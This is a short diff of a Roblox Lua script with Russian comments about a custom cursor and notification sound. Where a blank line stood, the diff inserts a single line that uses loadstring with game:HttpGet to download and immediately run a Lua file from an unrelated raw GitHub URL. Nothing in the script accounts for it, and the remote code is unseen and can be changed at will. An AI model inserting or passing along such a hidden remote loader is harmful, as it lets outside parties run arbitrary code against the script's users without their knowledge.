@@ -9,7 +9,7 @@ local TweenService = game:GetService('TweenService');
 local RenderStepped = RunService.RenderStepped;
 local LocalPlayer = Players.LocalPlayer;
 local Mouse = LocalPlayer:GetMouse();
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/N9TALovchik/-/refs/heads/main/addons/NOTALovchik.lua"))()
 -- ========== НАСТРАИВАЕМЫЕ ПАРАМЕТРЫ ==========
 local CURSOR_IMAGE_ID = "18392993708"   -- ID изображения для кастомного курсора
 local NOTIFY_SOUND_ID = "132463144859699"    -- ID звука уведомлений
